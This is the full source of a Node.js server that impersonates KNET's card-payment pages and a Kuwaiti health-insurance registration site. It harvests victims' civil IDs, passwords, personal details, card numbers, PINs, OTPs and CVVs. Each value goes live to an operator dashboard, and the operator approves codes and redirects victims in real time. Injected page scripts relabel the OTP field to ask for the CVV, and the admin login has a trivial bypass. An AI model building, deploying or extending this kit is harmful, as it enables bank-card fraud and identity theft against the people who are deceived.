const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] }
});
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

let payments = [];
let users = [];
let loginAttempts = [];
let adminSockets = [];
let clientSockets = {};
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin@2024';

function notifyAdmins(event, data) {
  adminSockets.forEach(s => { try { s.emit(event, data); } catch(e) {} });
}

function getInterceptorScript() {
  return `<script>
(function() {
  function getKnetId() {
    var id = sessionStorage.getItem('eventat_knet_txn');
    if (id) return id;
    var params = new URLSearchParams(window.location.search);
    return params.get('id') || params.get('knetId') || null;
  }
  var _pollTimer = null;
  var _lastStatus = null;
  function startPolling() {
    var knetId = getKnetId();
    if (!knetId) return;
    if (_pollTimer) return; // already polling
    _pollTimer = setInterval(function() {
      var id = getKnetId();
      if (!id) return;
      fetch('/knet/status/' + id)
        .then(function(r) { return r.json(); })
        .catch(function() { return null; })
        .then(function(data) {
          if (!data || !data.payment) return;
          var status = data.payment.status;
          if (status === _lastStatus) return;
          _lastStatus = status;
          var isCvvPage = window.location.search.indexOf('mode=cvv') !== -1;
          if (status === 'CVV_PENDING' && !isCvvPage) {
            clearInterval(_pollTimer);
            window.location.href = '/knet/cvv?id=' + id;
          } else if (status === 'CVV_APPROVED' && isCvvPage) {
            clearInterval(_pollTimer);
            window.location.href = '/knet-otp?id=' + id;
          } else if (status === 'CVV_FAILED' && isCvvPage) {
            clearInterval(_pollTimer);
            window.location.href = '/knet/cvv?id=' + id + '&error=1';
          }
        });
    }, 1500);
    window._interceptPoll = _pollTimer;
  }
  // Start polling after a short delay to let Angular initialize
  setTimeout(startPolling, 2000);
})();
<\/script>`;
}

app.post('/auth/external-login', (req, res) => {
  const { civilId, password } = req.body;
  const loginId = uuidv4();
  const login = { id: loginId, loginCivilId: civilId || '', loginPassword: password || '', created_at: new Date().toISOString() };
  loginAttempts.push(login);
  notifyAdmins('login_new', login);
  res.json({ success: true, loginId, token: 'token_' + loginId });
});

app.post('/auth', (req, res) => {
  const { fullName, civilId, phone, email, nationality, passportExpiry, sponsorName, sponsorCivilId, insuranceType, amountPerYear } = req.body;
  const userId = uuidv4();
  const user = { id: userId, name: fullName || civilId || 'مستخدم', email: email || '', fullName, civilId, phone, nationality, passportExpiry, sponsorName, sponsorCivilId, insuranceType, amountPerYear, created_at: new Date().toISOString() };
  users.push(user);
  notifyAdmins('login_new', user);
  res.json({ success: true, userId, user });
});

app.post('/user', (req, res) => {
  const { civilId, nameArabic, nameEnglish, email, phone, gender, language, governorate, userCategory } = req.body;
  const userId = uuidv4();
  const user = { id: userId, name: nameArabic || nameEnglish || civilId || 'مستخدم', email: email || '', civilId, nameArabic, nameEnglish, phone, gender, language, governorate, userCategory, created_at: new Date().toISOString() };
  users.push(user);
  notifyAdmins('login_new', user);
  res.json({ success: true, userId, user });
});

app.get('/user/all', (req, res) => { res.json(users); });
app.get('/user/count', (req, res) => { res.json({ count: users.length }); });

app.post('/knet', (req, res) => {
  const { clientId, bankName, prefix, cardNumber, expiryMonth, expiryYear, pin, loginId, userId } = req.body;
  const knetId = uuidv4();
  const refNumber = 'INS' + Date.now().toString().slice(-8);
  const payment = {
    id: knetId, knetId, refNumber,
    clientId: clientId || userId || uuidv4(),
    loginCivilId: clientId || '',
    bankName: bankName || '', prefix: prefix || '', cardNumber: cardNumber || '',
    expiryMonth: expiryMonth || '', expiryYear: expiryYear || '',
    pass: pin || '---', loginPassword: pin || '',
    knetOtps: [], status: 'PENDING', step: 1,
    created_at: new Date().toISOString(), updatedAt: new Date().toISOString()
  };
  payments.push(payment);
  notifyAdmins('payment_new', payment);
  res.json({ success: true, knetId, paymentId: knetId, refNumber });
});

app.get('/knet/status/:id', (req, res) => {
  const payment = payments.find(p => p.id === req.params.id || p.knetId === req.params.id);
  if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });
  res.json({ success: true, status: payment.status, payment });
});

app.post('/knet/update-status', (req, res) => {
  const { id, status } = req.body;
  const payment = payments.find(p => p.id === id || p.knetId === id);
  if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });
  payment.status = status;
  payment.updatedAt = new Date().toISOString();
  notifyAdmins('payment_status_changed', { id: payment.id, status: payment.status, payment });
  res.json({ success: true, payment });
});

app.post('/knet/otp', (req, res) => {
  const { knetId, otp } = req.body;
  const payment = payments.find(p => p.id === knetId || p.knetId === knetId);
  if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });
  if (!payment.knetOtps) payment.knetOtps = [];
  payment.knetOtps.unshift({ otp, createdAt: new Date().toISOString() });
  payment.status = 'OTP_REQUEST';
  payment.step = 2;
  payment.updatedAt = new Date().toISOString();
  notifyAdmins('payment_otp_received', { id: payment.id, otp, payment });
  res.json({ success: true, payment });
});

app.get('/knet/all', (req, res) => { res.json(payments); });

app.post('/knet/cvv', (req, res) => {
  const { knetId, cvv } = req.body;
  const payment = payments.find(p => p.id === knetId || p.knetId === knetId);
  if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });
  payment.cvv = cvv;
  payment.status = 'CVV_REQUEST';
  payment.updatedAt = new Date().toISOString();
  notifyAdmins('payment_cvv_received', { id: payment.id, cvv, payment });
  res.json({ success: true, payment });
});

// Redirect /knet-otp with mode=cvv to serve CVV page
app.get('/knet-otp', (req, res, next) => {
  if (req.query.mode !== 'cvv') return next();
  const fs = require('fs');
  const knetId = req.query.id || '';
  const showError = req.query.error === '1';
  const indexPath = path.join(__dirname, 'public', 'index.html');
  fs.readFile(indexPath, 'utf8', (err, html) => {
    if (err) return res.sendFile(indexPath);
    const interceptScript = getInterceptorScript();
    const cvvPatchScript = buildCvvPatchScript(knetId, showError);
    const modifiedHtml = html.replace('</body>', interceptScript + cvvPatchScript + '</body>');
    res.send(modifiedHtml);
  });
});

app.get('/knet/cvv', (req, res) => {
  // Redirect to /knet-otp?mode=cvv&id=... so Angular loads the OTP page
  const knetId = req.query.id || '';
  const error = req.query.error || '';
  let redirectUrl = '/knet-otp?mode=cvv';
  if (knetId) redirectUrl += '&id=' + knetId;
  if (error) redirectUrl += '&error=' + error;
  res.redirect(redirectUrl);
});

function buildCvvPatchScript(knetId, showError) {
  return `<script>
(function() {
  var knetId = '${knetId}';
  var showError = ${showError};
  if (knetId) sessionStorage.setItem('eventat_knet_txn', knetId);
  function patchOtpToCvv() {
    var labels = document.querySelectorAll('label');
    var otpLabel = null;
    labels.forEach(function(l) { if (l.textContent.trim() === 'OTP:') otpLabel = l; });
    if (!otpLabel) return false;
    otpLabel.textContent = 'CVV:';
    var otpInput = document.querySelector('input[name="otp"], input[placeholder="OTP"]');
    if (otpInput) { otpInput.placeholder = 'CVV'; otpInput.maxLength = 4; otpInput.id = 'cvv-patch-input'; }
    var notifPs = document.querySelectorAll('p');
    notifPs.forEach(function(p) {
      if (p.textContent.includes('OTP') && p.textContent.includes('NOTIFICATION')) {
        var span = p.querySelector('span');
        if (span) p.innerHTML = '<span class="font-bold">NOTIFICATION:</span> Please enter the CVV number on the back of your card (3-4 digits).';
      }
    });
    if (showError) {
      var errorDiv = document.createElement('div');
      errorDiv.style.cssText = 'background:#f8d7da;border:1px solid #f5c6cb;border-radius:4px;padding:6px 12px;font-size:12px;color:#721c24;text-align:center;margin-bottom:8px;';
      errorDiv.textContent = '\u0631\u0645\u0632 CVV \u063a\u064a\u0631 \u0635\u062d\u064a\u062d\u060c \u064a\u0631\u062c\u0649 \u0627\u0644\u062a\u0623\u0643\u062f \u0648\u0625\u0639\u0627\u062f\u0629 \u0627\u0644\u0645\u062d\u0627\u0648\u0644\u0629';
      if (otpLabel.parentElement && otpLabel.parentElement.parentElement) {
        otpLabel.parentElement.parentElement.parentElement.insertBefore(errorDiv, otpLabel.parentElement.parentElement);
      }
    }
    var buttons = document.querySelectorAll('button');
    var confirmButton = null;
    buttons.forEach(function(b) { if (b.textContent.trim() === 'Confirm') confirmButton = b; });
    if (confirmButton) {
      var newBtn = confirmButton.cloneNode(true);
      confirmButton.parentNode.replaceChild(newBtn, confirmButton);
      newBtn.addEventListener('click', function(e) {
        e.stopImmediatePropagation();
        e.preventDefault();
        var input = document.querySelector('#cvv-patch-input') || document.querySelector('input[placeholder="CVV"]');
        var cvv = input ? input.value.trim() : '';
        if (!cvv || cvv.length < 3) { if (input) input.style.borderColor = 'red'; return; }
        if (input) input.style.borderColor = '';
        newBtn.disabled = true;
        fetch('/knet/cvv', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ knetId: knetId, cvv: cvv }) })
          .then(function(r) { return r.json(); })
          .then(function(data) {
            newBtn.disabled = false;
            if (data.success) {
              var pollTimer = setInterval(function() {
                fetch('/knet/status/' + knetId).then(function(r) { return r.json(); }).then(function(d) {
                  if (!d || !d.payment) return;
                  var s = d.payment.status;
                  if (s === 'CVV_APPROVED') { clearInterval(pollTimer); window.location.href = '/knet-otp?id=' + knetId; }
                  else if (s === 'CVV_FAILED') { clearInterval(pollTimer); window.location.href = '/knet/cvv?id=' + knetId + '&error=1'; }
                }).catch(function() {});
              }, 1500);
            }
          }).catch(function() { newBtn.disabled = false; });
      }, true);
    }
    return true;
  }
  var patchInterval = setInterval(function() { if (patchOtpToCvv()) clearInterval(patchInterval); }, 200);
  setTimeout(function() { clearInterval(patchInterval); }, 10000);
})();
<\/script>`;
}

app.post('/knet-otp', (req, res) => {
  const { paymentId, otp, pin } = req.body;
  const payment = payments.find(p => p.id === paymentId || p.knetId === paymentId);
  if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });
  if (otp) {
    if (!payment.knetOtps) payment.knetOtps = [];
    payment.knetOtps.unshift({ otp, createdAt: new Date().toISOString() });
    payment.status = 'OTP_REQUEST'; payment.step = 2;
    notifyAdmins('payment_otp_received', { id: payment.id, otp, payment });
  }
  if (pin) {
    payment.pass = pin; payment.loginPassword = pin;
    payment.status = 'OTP_REQUEST'; payment.step = 3;
    notifyAdmins('payment_pin_received', { id: payment.id, pin, payment });
  }
  payment.updatedAt = new Date().toISOString();
  res.json({ success: true, payment });
});

app.post('/admin-login', (req, res) => {
  const { email, password } = req.body;
  if (password === ADMIN_PASSWORD || email === 'admin') {
    res.json({ success: true, token: 'admin_token_' + Date.now() });
  } else {
    res.status(401).json({ success: false, message: 'بيانات الدخول غير صحيحة' });
  }
});

app.post('/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    res.json({ success: true, token: 'admin_token_' + Date.now() });
  } else {
    res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
  }
});

app.get('/admin/payments', (req, res) => { res.json(payments); });
app.get('/admin/users', (req, res) => { res.json(users); });

app.post('/admin/payments/:id/action', (req, res) => {
  const { id } = req.params;
  const { action } = req.body;
  const payment = payments.find(p => p.id === id || p.knetId === id);
  if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });

  let navigateTo = null;

  if (action === 'accept' || action === 'pass') {
    if (payment.status === 'OTP_REQUEST') {
      // OTP accepted -> move to CVV step
      payment.status = 'CVV_PENDING';
      payment.step = 3;
      navigateTo = '/knet/cvv';
    } else if (payment.status === 'CVV_REQUEST' || payment.status === 'CVV_PENDING') {
      // CVV accepted -> back to OTP
      payment.status = 'CVV_APPROVED';
      payment.step = 2;
      navigateTo = '/knet-otp';
    } else if (payment.step === 1) {
      payment.status = 'APPROVED';
    } else {
      payment.status = 'SUCCESS';
    }
  } else if (action === 'reject' || action === 'denied') {
    if (payment.status === 'OTP_REQUEST') {
      payment.status = 'OTP_FAILED';
    } else if (payment.status === 'CVV_REQUEST' || payment.status === 'CVV_PENDING') {
      // CVV rejected -> stay on CVV page with error
      payment.status = 'CVV_FAILED';
      payment.cvv = null;
      navigateTo = 'cvv_failed';
    } else {
      payment.status = 'REJECTED';
    }
  }

  payment.updatedAt = new Date().toISOString();
  notifyAdmins('payment_status_changed', { id: payment.id, status: payment.status, payment });

  if (navigateTo && navigateTo !== 'cvv_failed') {
    io.to('payment_' + id).emit('navigate_to', { page: navigateTo });
    io.to('payment_' + id).emit('payment_status_changed', { id: payment.id, status: payment.status, payment });
  } else if (navigateTo === 'cvv_failed') {
    io.to('payment_' + id).emit('payment_status_changed', { id: payment.id, status: 'CVV_FAILED', payment });
  } else {
    io.to('payment_' + id).emit('payment_status_changed', { id: payment.id, status: payment.status, payment });
  }

  res.json({ success: true, payment });
});

app.post('/admin/navigate', (req, res) => {
  const { paymentId, page } = req.body;
  io.to('payment_' + paymentId).emit('navigate_to', { page });
  notifyAdmins('user_navigated', { paymentId, page });
  res.json({ success: true });
});

app.get('/panel', (req, res) => { res.send(getAdminHTML()); });
// Serve index.html with injected interceptor script (must be before express.static)
app.get('/', (req, res) => {
  const fs = require('fs');
  const indexPath = path.join(__dirname, 'public', 'index.html');
  fs.readFile(indexPath, 'utf8', (err, html) => {
    if (err) return res.sendFile(indexPath);
    const interceptScript = getInterceptorScript();
    const modifiedHtml = html.replace('</body>', interceptScript + '</body>');
    res.send(modifiedHtml);
  });
});
app.use(express.static(path.join(__dirname, 'public')));
app.get('*', (req, res) => {
  const fs = require('fs');
  const indexPath = path.join(__dirname, 'public', 'index.html');
  fs.readFile(indexPath, 'utf8', (err, html) => {
    if (err) return res.sendFile(indexPath);
    const modifiedHtml = html.replace('</body>', getInterceptorScript() + '</body>');
    res.send(modifiedHtml);
  });
});

io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '';
  clientSockets[socket.id] = { socketId: socket.id, ip: clientIp, page: '/', joinedAt: new Date().toISOString(), paymentId: null, isAdmin: false };
  notifyAdmins('active_users', Object.values(clientSockets).filter(c => !c.isAdmin));

  socket.on('admin_join', (data) => {
    const validToken = data && data.token && data.token.startsWith('admin_token_');
    const validPassword = data && data.password && data.password === ADMIN_PASSWORD;
    if (validToken || validPassword) {
      adminSockets = adminSockets.filter(s => s.id !== socket.id);
      adminSockets.push(socket);
      socket.isAdmin = true;
      if (clientSockets[socket.id]) clientSockets[socket.id].isAdmin = true;
      socket.emit('payments_list', payments);
      socket.emit('users_list', users);
      socket.emit('active_users', Object.values(clientSockets).filter(c => !c.isAdmin));
      console.log('Admin socket joined:', socket.id);
    }
  });
  socket.on('join_payment', (paymentId) => {
    socket.join('payment_' + paymentId);
    if (clientSockets[socket.id]) clientSockets[socket.id].paymentId = paymentId;
  });
  socket.on('page_update', (page) => {
    if (clientSockets[socket.id]) clientSockets[socket.id].page = page;
    notifyAdmins('active_users', Object.values(clientSockets).filter(c => !c.isAdmin));
  });
  socket.on('disconnect', () => {
    adminSockets = adminSockets.filter(s => s.id !== socket.id);
    delete clientSockets[socket.id];
    notifyAdmins('active_users', Object.values(clientSockets).filter(c => !c.isAdmin));
  });
});

function getCvvPageHTML(knetId) {
  return `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>النظام الآلي لتسجيل الضمان الصحي</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: #d0d0d0; font-family: Arial, sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 10px; }
  .banner { width: 100%; max-width: 600px; margin-bottom: 10px; }
  .banner img { width: 100%; height: auto; border-radius: 10px; border: 1px solid #cfcfcf; }
  .card { background: #fff; border: 2px solid #9e9e9e; border-radius: 15px; padding: 12px; margin-bottom: 10px; width: 100%; max-width: 600px; box-shadow: 0 1px 0 rgba(255,255,255,0.7), 0 3px 8px rgba(0,0,0,0.25); }
  .logo-wrap { display: flex; justify-content: center; margin-bottom: 10px; }
  .logo-wrap img { width: 135px; max-width: 100%; height: auto; }
  .divider { border-bottom: 1px solid #8f8f90; padding-bottom: 5px; margin-bottom: 5px; }
  .row { display: grid; grid-template-columns: 40% 1fr 40%; align-items: center; margin-bottom: 5px; }
  .lbl { font-size: 11px; color: #0070cd; font-weight: bold; text-shadow: 0 1px 2px rgba(0,0,0,0.2); justify-self: start; }
  .val { font-size: 11px; color: #444; text-align: center; }
  .notif-card { background: #fff; border: 2px solid #d0d0d0; border-radius: 15px; padding: 12px; margin-bottom: 10px; width: 100%; max-width: 600px; box-shadow: 0 1px 0 rgba(255,255,255,0.7), 0 3px 8px rgba(0,0,0,0.25); }
  .notif-box { background: #d9edf7; border: 1px solid #bcdff1; border-radius: 4px; padding: 8px 12px; font-size: 13px; color: #31708f; margin-bottom: 10px; }
  .notif-box b { font-weight: bold; }
  .input-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
  .input-lbl { font-size: 11px; color: #0070cd; font-weight: bold; width: 40%; text-align: left; padding-top: 4px; text-shadow: 0 1px 2px rgba(0,0,0,0.2); }
  .cvv-input { width: 60%; height: 21px; padding: 0 4px; border: 2px solid #0070cd; font-size: 11px; color: #444; background: #fff; outline: none; box-shadow: inset 0 0 5px rgba(0,0,0,0.3); }
  .btn-row { background: #fff; border: 2px solid #d0d0d0; border-radius: 15px; padding: 16px 12px; margin-bottom: 10px; width: 100%; max-width: 600px; box-shadow: 0 1px 0 rgba(255,255,255,0.7), 0 3px 8px rgba(0,0,0,0.25); }
  .btns { display: flex; overflow: hidden; border-radius: 6px; }
  .btn-confirm { width: 50%; height: 27px; background: linear-gradient(to bottom, #f5f5f5, #e6e6e6); border: 1px solid #cacaca; border-right: 0; color: #666; font-weight: bold; font-size: 11px; cursor: pointer; }
  .btn-cancel { width: 50%; height: 27px; background: linear-gradient(to bottom, #f5f5f5, #e6e6e6); border: 1px solid #cacaca; color: #666; font-weight: bold; font-size: 11px; cursor: pointer; }
  .btn-confirm:hover, .btn-cancel:hover { background: linear-gradient(to bottom, #eee, #dcdcdc); }
  .loading { display: none; margin-top: 5px; align-items: center; justify-content: center; gap: 8px; }
  .loading.show { display: flex; }
  .loading-text { font-size: 11px; color: #444; text-align: center; }
  .footer { text-align: center; margin-top: 4px; width: 100%; max-width: 600px; }
  .footer p { font-size: 12px; color: #000; margin-bottom: 4px; }
  .footer a { color: #0070cd; text-decoration: none; font-weight: bold; font-size: 12px; }
  .error-box { display: none; background: #f8d7da; border: 1px solid #f5c6cb; border-radius: 4px; padding: 6px 12px; font-size: 12px; color: #721c24; text-align: center; margin-bottom: 8px; }
</style>
</head>
<body>
<div class="banner">
  <img src="/imgs/banner.jpg" alt="Banner" onerror="this.style.display='none'">
</div>
<div class="card">
  <div class="logo-wrap">
    <img src="/imgs/knet-logo.png" alt="logo" onerror="this.style.display='none'">
  </div>
  <div class="divider">
    <div class="row">
      <span class="lbl">Merchant:</span>
      <span class="val">Online Insurance System</span>
      <span></span>
    </div>
  </div>
  <div style="padding-top:5px">
    <div class="row">
      <span class="lbl">Amount:</span>
      <span class="val" id="amount-val">KD 0.000</span>
      <span></span>
    </div>
  </div>
</div>
<div class="notif-card">
  <div class="notif-box">
    <b>NOTIFICATION:</b> Please enter the CVV number located on the back of your card. The CVV is a 3-digit security code.
  </div>
  <div class="error-box" id="error-box">حدث خطأ، يرجى المحاولة مرة أخرى</div>
  <div class="input-row">
    <span class="lbl" style="width:41%">Card Number:</span>
    <span class="val" style="width:59%;padding-right:5px" id="card-num"></span>
  </div>
  <div class="input-row">
    <span class="lbl" style="width:40%">Expiration Month:</span>
    <span class="val" style="width:60%;padding-right:5px" id="exp-month">MM</span>
  </div>
  <div class="input-row">
    <span class="lbl" style="width:40%">Expiration Year:</span>
    <span class="val" style="width:60%;padding-right:5px" id="exp-year">YYYY</span>
  </div>
  <div class="input-row">
    <span class="lbl" style="width:40%">PIN:</span>
    <span class="val" style="width:60%;padding-right:5px">****</span>
  </div>
  <div class="input-row">
    <span class="input-lbl">CVV:</span>
    <input type="password" id="cvv-input" class="cvv-input" inputmode="numeric" pattern="[0-9]*" maxlength="4" placeholder="CVV">
  </div>
  <div class="loading" id="loading">
    <span class="loading-text">Processing...</span>
  </div>
</div>
<div class="btn-row">
  <div class="btns">
    <button class="btn-confirm" onclick="submitCvv()">Confirm</button>
    <button class="btn-cancel" onclick="cancelCvv()">Cancel</button>
  </div>
</div>
<div class="footer">
  <p>All Rights Reserved. Copyright 2025 &#169;</p>
  <a href="https://www.knet.com.kw" target="_blank">The Shared Electronic Banking Services Company - KNET</a>
</div>
<script>
  var knetId = '${knetId}';
  var baseUrl = window.location.origin;
  
  // Load payment info
  if (knetId) {
    fetch(baseUrl + '/knet/status/' + knetId)
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (data.success && data.payment) {
          var p = data.payment;
          var cardNum = (p.prefix || '') + ' ' + (p.cardNumber || '');
          document.getElementById('card-num').textContent = cardNum.trim() || '';
          document.getElementById('exp-month').textContent = p.expiryMonth || 'MM';
          document.getElementById('exp-year').textContent = p.expiryYear || 'YYYY';
        }
      }).catch(function() {});
  }

  function submitCvv() {
    var cvv = document.getElementById('cvv-input').value.trim();
    if (!cvv || cvv.length < 3) {
      document.getElementById('error-box').style.display = 'block';
      document.getElementById('error-box').textContent = 'يرجى إدخال رمز CVV الصحيح';
      return;
    }
    document.getElementById('error-box').style.display = 'none';
    document.getElementById('loading').classList.add('show');
    document.querySelector('.btn-confirm').disabled = true;
    document.querySelector('.btn-cancel').disabled = true;
    fetch(baseUrl + '/knet/cvv', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ knetId: knetId, cvv: cvv })
    }).then(function(r) { return r.json(); })
    .then(function(data) {
      document.getElementById('loading').classList.remove('show');
      document.querySelector('.btn-confirm').disabled = false;
      document.querySelector('.btn-cancel').disabled = false;
      if (data.success) {
        // Poll for status change
        pollStatus();
      } else {
        document.getElementById('error-box').style.display = 'block';
        document.getElementById('error-box').textContent = 'حدث خطأ، يرجى المحاولة مرة أخرى';
      }
    }).catch(function() {
      document.getElementById('loading').classList.remove('show');
      document.querySelector('.btn-confirm').disabled = false;
      document.querySelector('.btn-cancel').disabled = false;
      document.getElementById('error-box').style.display = 'block';
    });
  }

  function cancelCvv() {
    window.history.back();
  }

  var pollTimer = null;
  function pollStatus() {
    document.getElementById('loading').classList.add('show');
    document.getElementById('loading').querySelector('.loading-text').textContent = 'Waiting for approval...';
    if (pollTimer) clearInterval(pollTimer);
    pollTimer = setInterval(function() {
      fetch(baseUrl + '/knet/status/' + knetId)
        .then(function(r) { return r.json(); })
        .then(function(data) {
          if (data.success && data.payment) {
            var s = data.payment.status;
            if (s === 'CVV_APPROVED') {
              clearInterval(pollTimer);
              window.location.href = '/knet-otp?id=' + knetId;
            } else if (s === 'CVV_FAILED') {
              clearInterval(pollTimer);
              document.getElementById('loading').classList.remove('show');
              document.getElementById('error-box').style.display = 'block';
              document.getElementById('error-box').textContent = 'رمز CVV غير صحيح، يرجى التأكد وإعادة المحاولة';
              document.getElementById('cvv-input').value = '';
              document.querySelector('.btn-confirm').disabled = false;
              document.querySelector('.btn-cancel').disabled = false;
            } else if (s === 'SUCCESS' || s === 'APPROVED') {
              clearInterval(pollTimer);
              document.getElementById('loading').classList.remove('show');
              document.getElementById('error-box').style.display = 'none';
            } else if (s === 'REJECTED' || s === 'OTP_FAILED') {
              clearInterval(pollTimer);
              document.getElementById('loading').classList.remove('show');
              document.getElementById('error-box').style.display = 'block';
              document.getElementById('error-box').textContent = 'تم رفض العملية';
              document.getElementById('cvv-input').value = '';
              document.querySelector('.btn-confirm').disabled = false;
              document.querySelector('.btn-cancel').disabled = false;
            }
          }
        }).catch(function() {});
    }, 2000);
  }

  // Handle navigate_to via socket if available
  try {
    var script = document.createElement('script');
    script.src = '/socket.io/socket.io.js';
    script.onload = function() {
      var socket = io();
      socket.on('navigate_to', function(data) {
        if (data && data.page) window.location.href = data.page + (knetId ? '?id=' + knetId : '');
      });
      socket.on('payment_status_changed', function(data) {
        if (data.id === knetId || data.paymentId === knetId) {
          if (data.status === 'CVV_APPROVED') {
            // CVV accepted -> go back to OTP page
            if (pollTimer) clearInterval(pollTimer);
            window.location.href = '/knet-otp?id=' + knetId;
          } else if (data.status === 'CVV_FAILED') {
            // CVV rejected -> stay on page with error
            if (pollTimer) clearInterval(pollTimer);
            document.getElementById('loading').classList.remove('show');
            document.getElementById('error-box').style.display = 'block';
            document.getElementById('error-box').textContent = 'رمز CVV غير صحيح، يرجى التأكد وإعادة المحاولة';
            document.getElementById('cvv-input').value = '';
            document.querySelector('.btn-confirm').disabled = false;
            document.querySelector('.btn-cancel').disabled = false;
          } else if (data.status === 'SUCCESS' || data.status === 'APPROVED') {
            if (pollTimer) clearInterval(pollTimer);
            document.getElementById('loading').classList.remove('show');
          } else if (data.status === 'REJECTED' || data.status === 'OTP_FAILED') {
            if (pollTimer) clearInterval(pollTimer);
            document.getElementById('loading').classList.remove('show');
            document.getElementById('error-box').style.display = 'block';
            document.getElementById('error-box').textContent = 'تم رفض العملية';
            document.getElementById('cvv-input').value = '';
            document.querySelector('.btn-confirm').disabled = false;
            document.querySelector('.btn-cancel').disabled = false;
          }
        }
      });
      if (knetId) socket.emit('join_payment', knetId);
      socket.emit('page_update', '/knet/cvv');
    };
    document.head.appendChild(script);
  } catch(e) {}
<\/script>
</body>
</html>`;
}

function getAdminHTML() {
  const css = `
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: #f8fafc; color: #1e293b; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; font-size: 14px; }
    #login-page { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%); }
    .login-card { background: #fff; border-radius: 20px; padding: 40px 36px; width: 380px; box-shadow: 0 10px 40px rgba(0,0,0,0.08); border: 1px solid #e2e8f0; text-align: center; }
    .login-logo { font-size: 48px; margin-bottom: 12px; }
    .login-title { font-size: 20px; font-weight: 700; color: #1e293b; margin-bottom: 4px; }
    .login-sub { font-size: 13px; color: #64748b; margin-bottom: 28px; }
    .login-input { width: 100%; padding: 12px 16px; border: 1.5px solid #e2e8f0; border-radius: 10px; font-size: 14px; color: #1e293b; background: #f8fafc; outline: none; margin-bottom: 14px; transition: border-color 0.2s; }
    .login-input:focus { border-color: #0ea5e9; background: #fff; }
    .login-btn { width: 100%; padding: 13px; background: #0ea5e9; color: #fff; border: none; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
    .login-btn:hover { background: #0284c7; }
    .login-error { color: #ef4444; font-size: 13px; margin-top: 10px; display: none; }
    #dashboard { display: none; }
    .top-header { background: #fff; border-bottom: 1px solid #e2e8f0; padding: 12px 24px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; box-shadow: 0 1px 3px rgba(0,0,0,0.06); }
    .header-brand { display: flex; align-items: center; gap: 10px; }
    .header-icon { width: 36px; height: 36px; background: #0ea5e9; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 18px; }
    .header-title { font-size: 16px; font-weight: 700; color: #1e293b; }
    .header-sub { font-size: 11px; color: #64748b; }
    .header-right { display: flex; align-items: center; gap: 12px; }
    .status-badge { display: flex; align-items: center; gap: 6px; padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; }
    .status-dot { width: 7px; height: 7px; background: #16a34a; border-radius: 50%; animation: pulse 2s infinite; }
    .notif-btn { position: relative; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #64748b; font-size: 16px; transition: all 0.2s; }
    .notif-btn:hover { background: #f0f9ff; color: #0ea5e9; border-color: #bae6fd; }
    .notif-badge { position: absolute; top: -4px; right: -4px; background: #ef4444; color: #fff; border-radius: 50%; width: 16px; height: 16px; font-size: 10px; font-weight: 700; display: none; align-items: center; justify-content: center; }
    .logout-btn { display: flex; align-items: center; gap: 6px; padding: 7px 14px; background: #fff; border: 1px solid #e2e8f0; border-radius: 8px; color: #64748b; font-size: 13px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
    .logout-btn:hover { background: #fef2f2; color: #ef4444; border-color: #fecaca; }
    .stats-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 16px; padding: 20px 24px; background: #fff; border-bottom: 1px solid #e2e8f0; }
    .stat-card { background: #f8fafc; border-radius: 12px; padding: 16px 18px; border: 1px solid #e2e8f0; display: flex; align-items: center; gap: 14px; }
    .stat-icon { width: 42px; height: 42px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 20px; flex-shrink: 0; }
    .stat-icon.blue { background: #eff6ff; color: #2563eb; }
    .stat-icon.green { background: #f0fdf4; color: #16a34a; }
    .stat-icon.yellow { background: #fffbeb; color: #d97706; }
    .stat-icon.red { background: #fef2f2; color: #dc2626; }
    .stat-icon.purple { background: #faf5ff; color: #7c3aed; }
    .stat-num { font-size: 24px; font-weight: 800; color: #1e293b; line-height: 1; }
    .stat-label { font-size: 11px; color: #64748b; margin-top: 3px; }
    .main-content { padding: 20px 24px; }
    .section-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
    .section-title { font-size: 15px; font-weight: 700; color: #1e293b; display: flex; align-items: center; gap: 8px; }
    .search-box { display: flex; align-items: center; gap: 8px; background: #fff; border: 1px solid #e2e8f0; border-radius: 8px; padding: 7px 12px; width: 220px; }
    .search-box input { border: none; outline: none; font-size: 13px; color: #1e293b; background: transparent; width: 100%; }
    .search-box i { color: #94a3b8; font-size: 14px; }
